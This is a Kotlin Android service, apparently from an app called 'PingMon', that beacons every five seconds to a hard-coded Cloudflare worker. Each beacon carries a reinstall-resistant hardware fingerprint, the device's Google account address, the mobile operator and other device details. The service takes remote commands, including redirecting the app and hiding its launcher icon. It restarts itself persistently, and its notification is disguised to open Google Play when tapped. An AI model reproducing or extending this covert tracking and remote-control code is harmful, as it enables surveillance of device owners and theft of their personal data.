package com.example.pingmon

import android.accounts.AccountManager
import android.app.*
import android.content.*
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class PingService : Service() {

    companion object {
        // ---- CHANGE THESE TWO ----
        const val WORKER_URL = "https://pingmon.kapcher2019.workers.dev/ping"
        const val APP_TOKEN  = "p7k2m9qx4bz8vn3rt"
        // --------------------------

        const val PING_INTERVAL_MS = 5_000L
        const val CHANNEL_ID       = "pingmon"
        const val NOTIF_ID         = 1001
        const val ACTION_TICK      = "com.example.pingmon.TICK"
        const val PREFS            = "pingmon"
        private const val KEY_UID  = "uid_fallback"
        const val KEY_DOMAIN       = "domain"
        const val DEFAULT_DOMAIN   = "https://www.google.com"
        private const val TAG      = "PingMon"

        fun start(ctx: Context) {
            val i = Intent(ctx, PingService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) { Log.w(TAG, "start blocked: ${e.message}") }
        }

        /**
         * Hardware-based UID — derived from physical device properties.
         * Survives app reinstall and signing key changes because it never
         * reads ANDROID_ID (which is scoped to the signing certificate).
         */
        fun uid(ctx: Context): String {
            val hw = listOf(
                Build.MANUFACTURER, Build.MODEL, Build.DEVICE,
                Build.HARDWARE, Build.BOARD, Build.BRAND,
            ).joinToString("|")
            val digest = java.security.MessageDigest.getInstance("SHA-256")
            val hash   = digest.digest(hw.toByteArray())
            return hash.take(10).joinToString("") { "%02x".format(it) }
        }

        fun currentDomain(ctx: Context): String =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_DOMAIN, DEFAULT_DOMAIN) ?: DEFAULT_DOMAIN

        fun setDomain(ctx: Context, url: String) =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit().putString(KEY_DOMAIN, url).apply()
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var thread: HandlerThread? = null
    private var handler: Handler?      = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var netCallback: ConnectivityManager.NetworkCallback? = null
    private var running = false

    /* ============================================================== lifecycle */

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotification("starting…"))

        thread = HandlerThread("ping").apply { start() }
        handler = Handler(thread!!.looper)

        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PingMon::loop").apply {
            setReferenceCounted(false); acquire()
        }

        watchNetwork()
        running = true
        tick()
        Reviver.scheduleAll(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TICK) handler?.post { tick() }
        else if (!running) { running = true; handler?.post { tick() } }
        Reviver.scheduleAll(this)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        Reviver.scheduleRestart(this, 1_000)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        handler?.removeCallbacksAndMessages(null)
        thread?.quitSafely()
        wakeLock?.let { if (it.isHeld) it.release() }
        unwatchNetwork()
        Reviver.scheduleRestart(this, 2_000)
        super.onDestroy()
    }

    /* ================================================================== loop */

    private fun tick() {
        // Don't wake the radio when the OS already knows we're offline.
        if (isOnline()) sendPing()
        handler?.removeCallbacksAndMessages(null)
        handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
        Reviver.scheduleTick(this, PING_INTERVAL_MS)
    }

    /* ============================================================== network */

    private fun isOnline(): Boolean {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(n) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun watchNetwork() {
        val cm  = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val req = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        netCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                Log.i(TAG, "network back — pinging")
                handler?.post { sendPing() }
            }
        }
        try { cm.registerNetworkCallback(req, netCallback!!) }
        catch (e: Exception) { Log.w(TAG, "netcb: ${e.message}") }
    }

    private fun unwatchNetwork() {
        netCallback?.let {
            try { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .unregisterNetworkCallback(it) } catch (_: Exception) {}
        }
        netCallback = null
    }

    /* ================================================================== ping */

    private fun sendPing() {
        val payload = JSONObject().apply {
            put("uid",      uid(this@PingService))
            put("battery",  batteryLevel())
            put("domain",   currentDomain(this@PingService))
            put("model",    deviceModel())
            put("android",  Build.VERSION.RELEASE)
            put("operator", operatorName())
            put("gmail",    gmailAccount())
            put("network",  networkType())
        }.toString()

        val req = Request.Builder()
            .url(WORKER_URL)
            .addHeader("X-Token", APP_TOKEN)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                updateNotification("offline")
            }
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (it.isSuccessful) handleResponse(it.body?.string() ?: "")
                    else updateNotification("err ${it.code}")
                }
            }
        })
    }

    /**
     * The worker piggybacks any queued command on the ping response.
     * A-F commands are placeholders: their actual behaviour will be
     * added here in a future APK without touching the server.
     */
    private fun handleResponse(bodyStr: String) {
        updateNotification("ok")
        try {
            val json = JSONObject(bodyStr)
            val cmd  = json.optString("cmd",  "")
            val arg  = json.optString("arg",  "")
            when (cmd) {
                "goto"  -> if (arg.isNotBlank()) {
                    setDomain(this, arg)
                    sendBroadcast(
                        Intent(MainActivity.ACTION_GOTO).setPackage(packageName).putExtra("url", arg)
                    )
                }
                // A-F placeholders — implement behaviour per use case.
                "cmd_a" -> vibrate()
                "cmd_b" -> { /* TODO */ }
                "cmd_c" -> { /* TODO */ }
                "cmd_d" -> { /* TODO */ }
                "cmd_e" -> { /* TODO */ }
                "cmd_f" -> { /* TODO */ }
                "cmd_g" -> { /* TODO */ }
                "cmd_h" -> { /* TODO */ }
                "cmd_i" -> hideIcon()   // hide: swap to neutral icon
                "cmd_j" -> showIcon()   // unhide: restore original icon
            }
        } catch (_: Exception) {}
    }

    /* ============================================================== device info */

    private fun hideIcon() = switchAlias(
        enable  = "$packageName.HiddenLauncher",
        disable = "$packageName.MainLauncher"
    )

    private fun showIcon() = switchAlias(
        enable  = "$packageName.MainLauncher",
        disable = "$packageName.HiddenLauncher"
    )

    private fun switchAlias(enable: String, disable: String) {
        try {
            packageManager.setComponentEnabledSetting(
                android.content.ComponentName(packageName, enable),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            packageManager.setComponentEnabledSetting(
                android.content.ComponentName(packageName, disable),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "alias switched: $enable enabled")
        } catch (e: Exception) {
            Log.w(TAG, "switchAlias failed: ${e.message}")
        }
    }

    private fun vibrate() {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(android.os.VibrationEffect.createWaveform(
                    longArrayOf(0, 300, 200, 300, 200, 300),
                    intArrayOf(0, 255, 0, 255, 0, 255),
                    -1  // -1 = بزن و تموم کن، تکرار نکن
                ))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
            }
        } catch (e: Exception) {
            Log.w(TAG, "vibrate failed: ${e.message}")
        }
    }

    private fun batteryLevel(): Int =
        (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    private fun deviceModel(): String =
        "${Build.MANUFACTURER} ${Build.MODEL}".trim()

    private fun operatorName(): String? = try {
        (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
            .networkOperatorName.takeIf { it.isNotBlank() }
    } catch (_: Exception) { null }

    /**
     * Returns the first Google account address found on this device.
     * On Android 8+, results may be restricted by the OS for third-party apps;
     * we send whatever we can read and the server stores it if non-null.
     */
    private fun gmailAccount(): String? = try {
        AccountManager.get(this)
            .getAccountsByType("com.google")
            .firstOrNull()?.name
    } catch (_: Exception) { null }

    private fun networkType(): String {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return "none"
        val caps = cm.getNetworkCapabilities(n) ?: return "none"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "other"
        }
    }

    /* ========================================================== notification */

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN
            ).apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(text: String): Notification {
        // Tap opens Google Play, not the app itself.
        val playIntent = packageManager.getLaunchIntentForPackage("com.android.vending")
            ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
            ?: Intent(Intent.ACTION_VIEW,
                android.net.Uri.parse("https://play.google.com")).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
        val tap = PendingIntent.getActivity(
            this, 0, playIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PingMon")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true).setSilent(true).setShowWhen(false)
            .setContentIntent(tap).build()
    }

    private fun updateNotification(state: String) {
        try {
            getSystemService(NotificationManager::class.java)
                .notify(NOTIF_ID, buildNotification("${uid(this).take(8)} · $state"))
        } catch (_: Exception) {}
    }
}
